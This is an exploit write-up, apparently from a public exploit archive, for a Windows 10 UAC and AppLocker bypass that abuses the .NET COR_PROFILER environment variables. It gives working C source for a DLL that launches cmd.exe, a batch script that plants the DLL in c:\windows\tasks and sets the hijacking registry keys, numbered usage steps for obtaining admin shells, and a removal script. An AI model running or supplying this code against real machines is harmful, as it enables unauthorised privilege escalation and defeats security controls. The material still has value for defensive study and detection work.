# Author: jsacco
# UAC Bypass on multiple applications + Applocker bypass
# test.dll under exploits/code/test.dll
# Source code ( note that it's using WINAPI ):
# How to use:
# 1. Copy test.dll from exploits/code/test.dll to your target folder
# 2. Create a add.bat script in the same folder and run it
# 3. Reboot the machine to check for Admin shells coming from services/tasks
# 4. To remove the environment variables and the key use the remove batch script
# 5. Remove test.dll from c:\windows\tasks
# Tested on Windows 10
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    char cmd[] = "cmd.exe";

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        WinExec(cmd, SW_SHOWNORMAL);
        ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

# batch script to activate:
copy test.dll c:\windows\tasks\
REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\windows\tasks\test.dll" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
REG ADD "HKCU\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER_PATH" /t REG_SZ /d "C:\windows\tasks\test.dll" /f'
# batch script to remove it
REG DELETE "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /f
REG DELETE "HKCU\Environment" /v "COR_PROFILER" /f
REG DELETE "HKCU\Environment" /v "COR_ENABLE_PROFILING" /f
REG DELETE "HKCU\Environment" /v "COR_PROFILER_PATH" /f
